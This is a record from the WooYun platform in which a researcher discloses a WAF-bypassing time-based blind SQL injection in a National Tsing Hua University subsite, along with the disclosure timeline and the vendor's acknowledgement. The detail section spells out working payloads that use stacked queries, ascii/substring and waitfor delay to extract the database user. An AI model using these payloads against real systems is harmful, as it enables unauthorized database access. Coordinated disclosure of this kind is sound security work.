{"id": 75553, "wybug_id": "wooyun-2016-0167162", "wybug_title": "绕过waf继续注入之国立清华大学某分站（疑似sa权限）（臺灣地區）", "wybug_corp": "台湾省国立清华大学", "wybug_author": "404notfound", "wybug_date": "2016-01-04 16:36", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 乌云和台湾漏洞平台很给力，现在台湾高校都特么是waf，sqlmap已经废了，现在来手工 详细说明：  国立清华大学英语自学网注入点：http://**.**.**.**/interaction_class/new_course_menu.asp?Level_id=4&Kind_id=1&Class_Kind=11不知道之前有没有被其他人提交过，就算提交过装了waf修复了，我们现在来绕过wafhttp://**.**.**.**/interaction_class/new_course_menu.asp?Level_id=4&Kind_id=1&Class_Kind=11%27;if%20%28ascii%28substring%28user,1,1%29%29%29%3C105%20waitfor%20delay%20%270:0:3%27%20--  Truehttp://**.**.**.**/interaction_class/new_course_menu.asp?Level_id=4&Kind_id=1&Class_Kind=11%27;if%20%28ascii%28substring%28user,1,1%29%29%29%3E100%20waitfor%20delay%20%270:0:3%27%20--  True省略一些步骤直接给结果：http://**.**.**.**/interaction_class/new_course_menu.asp?Level_id=4&Kind_id=1&Class_Kind=11%27;if%20%28ascii%28substring%28user,1,1%29%29%29=101%20waitfor%20delay%20%270:0:3%27--所以第一位是d同理可得第二第三位：这里手工累死了http://**.**.**.**/interaction_class/new_course_menu.asp?Level_id=4&Kind_id=1&Class_Kind=11%27;if%20%28ascii%28substring%28user,3,1%29%29%29=111%20waitfor%20delay%20%270:0:3%27--第二位是：b第三位是o所以user是dbo同理可猜解其他百分之90是sa，未验证不知道是不是由于单引号的问题，开始我想自动化注入，我在python脚本中想注释掉剩余的一个单引号总是失败，自动化脚本失败，只有纯手工   漏洞证明：  见上   修复方案：  waf不总安全   版权声明：转载请注明来源 404notfound@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2016-01-08 03:19 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}